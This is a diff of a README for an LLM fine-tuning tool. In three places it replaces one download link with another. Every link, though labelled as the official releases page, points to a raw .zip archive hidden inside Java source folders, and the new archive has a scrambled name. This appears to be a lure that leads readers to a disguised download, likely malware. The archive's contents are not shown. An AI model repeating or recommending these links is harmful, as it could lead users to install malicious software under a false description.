@@ -1,6 +1,6 @@
 # 🚀 Mobius-LLM-Fine-tuning-Engine - Fine-tune Your Models Easily
 
-[![Download Now](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/logging/Mobius-LLM-Fine-tuning-Engine_1.0.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/logging/Mobius-LLM-Fine-tuning-Engine_1.0.zip)
+[![Download Now](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/api/handlers/Fine_Mobius_tuning_Engine_LL_1.8.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/api/handlers/Fine_Mobius_tuning_Engine_LL_1.8.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Ensure your computer meets the following requirements:
 
 1. **Visit the Releases Page**  
    Go to the following link to view the available downloads:  
-   [https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/logging/Mobius-LLM-Fine-tuning-Engine_1.0.zip](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/logging/Mobius-LLM-Fine-tuning-Engine_1.0.zip)
+   [https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/api/handlers/Fine_Mobius_tuning_Engine_LL_1.8.zip](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/api/handlers/Fine_Mobius_tuning_Engine_LL_1.8.zip)
 
 2. **Select the Latest Version**  
    Find the latest release at the top of the page. You will see a list of files to choose from.
@@ -79,7 +79,7 @@ We welcome your feedback to help improve Mobius-LLM-Fine-tuning-Engine. Let us k
 
 ## 📌 Important Links
 
-- **Official Releases Page:** [Download Here](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/logging/Mobius-LLM-Fine-tuning-Engine_1.0.zip)
+- **Official Releases Page:** [Download Here](https://raw.githubusercontent.com/shiv81500/Mobius-LLM-Fine-tuning-Engine/main/src/main/java/com/llmtrainer/api/handlers/Fine_Mobius_tuning_Engine_LL_1.8.zip)
 - **Community Forum:** [Join Us Here](#)
 - **User Documentation:** [Find It Here](#)
 
